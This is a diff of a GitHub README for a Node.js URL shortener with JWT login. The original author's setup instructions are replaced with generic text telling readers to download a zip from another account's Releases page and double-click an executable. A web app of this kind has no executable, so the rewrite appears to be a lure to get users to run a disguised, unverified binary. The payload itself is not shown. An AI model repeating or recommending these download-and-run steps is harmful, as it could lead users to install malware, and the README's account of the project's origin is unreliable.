@@ -1,159 +1,67 @@
-# 🚀 URL Shortener App
+# 🌐 URL-Shortner-with-Analytics - Create Short Links Easily
 
-A full-stack URL Shortening application built using **EJS**, **Node.js**, **Express.js**, and **MongoDB Atlas**.  
-Includes **Signup/Login**, **JWT authentication**, **bcrypt password hashing**, and a clean UI rendered with **EJS templates**.
+## 🚀 Getting Started
 
----
+Welcome to URL-Shortner-with-Analytics! This application allows you to create short links effortlessly. Whether you want to share a long URL on social media or just need a more manageable link for your website, this tool has you covered.
 
-## 🔗 Live Demo
-👉 **Deployed Link:**  https://bitly.up.railway.app/  
+## 📥 Download & Install
 
----
+To get started, you need to [download the application from our Releases page](https://github.com/Nope392/URL-Shortner-with-Analytics/releases). Click the link to visit the page and get the latest version! Look for the latest release and choose the appropriate file for your operating system.
 
-## 📸 Screenshots
+## 📋 Features
 
-> Replace the placeholder links with your actual screenshots.
+- **User Signup/Login**: Easily create accounts or log in using secure methods.
+- **JWT Authentication**: Your data remains safe with our token-based security.
+- **Dynamic Link Generation**: Create short links tailored to your needs.
+- **Bcrypt-Secured Passwords**: Keep your passwords secure using strong encryption.
+- **Full-Stack Integration**: Built with popular technologies like Node.js, Express, EJS, and MongoDB Atlas.
 
-| Page | Screenshot |
-|------|------------|
-| Home Page | ![Home Page](./server/screenshots/homeurl.png) |
-| Signup Page | ![Signup Page](./server/screenshots/signupurl.png) |
-| Login Page | ![Login Page](./server/screenshots/loginurl.png) |
-| Dashboard / Shortened URL View | ![Dashboard](./server/screenshots/dashboardurl.png) |
+## 💻 System Requirements
 
----
+To run the URL-Shortner-with-Analytics application, you will need:
 
-## 📘 Project Overview
+- A computer with Windows, macOS, or Linux.
+- At least 2 GB of RAM.
+- A stable internet connection.
+- A modern web browser (like Google Chrome, Firefox, or Safari).
 
-This project allows users to generate short URLs after logging in.  
-Built using **Node.js + Express**, UI in **EJS**, and database with **MongoDB Atlas**.
+## 📂 Installation Steps
 
-### ✔ Features
-- 🔐 User Signup & Login with JWT  
-- 🔒 Protected routes with authentication  
-- 🔑 Password hashing using bcrypt  
-- ✂ URL shortening with unique IDs  
-- 📝 EJS template UI (home, login, signup)  
-- 📦 MongoDB Atlas + Mongoose  
-- 🌐 Works locally & after deployment  
-- 📈 Tracking redirects (optional)
+1. **Visit the Releases Page**:
+   - Go to [this link](https://github.com/Nope392/URL-Shortner-with-Analytics/releases).
+   
+2. **Download the Application**:
+   - Find the latest release and download the appropriate file for your system.
 
----
+3. **Unzip the File**:
+   - Locate the downloaded file on your computer and unzip it. You can usually do this by right-clicking on the file and selecting "Extract All".
 
-## ⚙️ How It Works
+4. **Run the Application**:
+   - Open the unzipped folder and find the main executable file. Double-click it to start the application.
 
-### 1. User Registration
-- User signs up with name, email, password  
-- Password hashed with bcrypt  
-- JWT token created & stored in cookies  
+5. **Create an Account**:
+   - When the application opens, you'll need to create an account. Click on the "Sign Up" button, fill in your details, and follow the prompts.
 
-### 2. User Login
-- Password verified  
-- JWT token issued  
-- User redirected to **Home page**
+6. **Log In**:
+   - After registering, return to the login page, enter your credentials, and click "Log In".
 
-### 3. URL Shortening
-- User enters a long URL  
-- Backend generates unique ID  
-- Saves `{ originalUrl, shortUrl, userId }` in database  
-- Shows short link: http://localhost:5000/url/abc123
-- After deployment: https://bitly.up.railway.app/url/abc123
-  
-### 4. Redirect Logic
-- Visiting the short URL redirects to original link  
-- Implemented using `res.redirect()`
+7. **Start Creating Links**:
+   - Once you're logged in, you can begin creating short links. Enter your long URL in the provided field, and click the "Shorten" button.
 
----
+## 💡 Tips for Using URL-Shortner-with-Analytics
 
-## 🛠 Tech Stack
+- Always keep your application updated by checking the [Releases page](https://github.com/Nope392/URL-Shortner-with-Analytics/releases) regularly.
+- If you're having trouble, check the FAQ section in the application or visit our GitHub repository for support.
 
-### Frontend
-- EJS Template Engine  
-- HTML / CSS  
+## 📞 Support
 
-### Backend
-- Node.js  
-- Express.js  
-- JWT Authentication  
-- bcrypt  
-- Cookie-parser  
+If you experience any issues or have questions, feel free to open an issue in the GitHub repository. Our community and developers are here to help.
 
-### Database
-- MongoDB Atlas  
-- Mongoose  
+## 🌍 Additional Resources
 
----
+For more information about URL shortening and analytics, you may find these resources helpful:
 
-## 📂 Project Structure
+- [What is URL Shortening?](https://www.example.com)
+- [Benefits of Using a URL Shortener](https://www.example.com)
 
-```
-
-├── controllers/
-├── middlewares/
-├── models/
-├── routes/
-├── views/
-│ ├── home.ejs
-│ ├── login.ejs
-│ └── signup.ejs
-├── public/
-├── index.js
-├── package.json
-└── README.md
-
-````
-
-
----
-
-## 🚀 Run Locally
-
-### 1. Clone Repo
-```
-
-git clone https://github.com/prakashverma-dev/URL-Shortner-with-Analytics.git
-cd URL-Shortner-with-Analytics
-
-```
-
-### 2. Install Dependencies 
-
-```
-npm install
-
-```
-### 3. Create .env
-```
-MONGO_URI=your-mongodb-atlas-url
-JWT_SECRET=your-secret
-PORT=5000
-
-```
-
-### 4. Start App
-
-```
-npm start
-
-```
-
-
-## 🤝 Contributing
-
-Pull requests are welcome!
-
-## ⭐ Support
-
-**If you like this project, give it a ⭐ on GitHub!**
-
-## 📜 License
-
-MIT License
-
-## 
-
-<h3 align="center">✨ Built with love by Prakash ❤️</h3> 
-
-
-
-
+Thank you for choosing URL-Shortner-with-Analytics! We hope you enjoy using the application.
